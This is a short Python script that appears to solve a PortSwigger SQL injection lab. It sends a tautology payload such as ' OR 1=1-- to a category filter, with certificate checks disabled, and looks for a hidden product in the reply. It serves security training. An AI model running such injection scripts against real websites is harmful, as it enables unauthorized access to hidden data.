#!/usr/bin/python3

import requests
import sys
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_lab_01(url, payload, proxies=None):
    path = "/filter?category="
    try:
        r = requests.get(url+path+payload, verify=False, proxies=proxies)
        if "Cheshire Cat Grin" in r.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"[X] Request failed: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Port Swigger Lab - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example.com)")
    parser.add_argument("-p", "--payload", help="SQL Injection Payload (e.g., ' OR 1=1--)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()

    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"[*] Using proxy: {args.proxy}")
    
    if sqli_lab_01(args.url.strip(), args.payload.strip(), proxies):
        print(f"[V] SQL Success!")
    else:
        print(f"[X] SQL Failed")